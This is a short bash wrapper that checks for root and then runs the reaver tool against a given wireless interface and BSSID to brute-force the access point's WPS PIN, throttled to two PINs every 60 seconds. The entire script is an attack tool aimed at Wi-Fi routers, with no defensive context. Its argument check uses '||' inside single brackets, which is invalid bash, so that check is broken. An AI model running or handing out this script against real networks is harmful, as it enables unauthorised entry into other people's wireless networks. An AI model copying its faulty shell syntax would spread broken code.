#!/bin/bash

#################################################################
# CHECKING FOR ROOT
#################################################################
if [ `echo -n $USER` != "root" ]
then
    echo "ERROR: Please run as root!"
    exit 1
fi

#################################################################
# CHECKING TO SEE IF INTERFACE IS PROVIDED
#################################################################
if [ -z ${1} || -z ${2} ]; then
    echo "Usage: `basename ${0}` interface BSSID"
    echo "Example #`basename ${0}` wlan0 34:4D:EA:94:12:E0"
    exit 1
fi
# Try 2 pins every 60 seconds
reaver -i $1 -b $2 -r 2:60
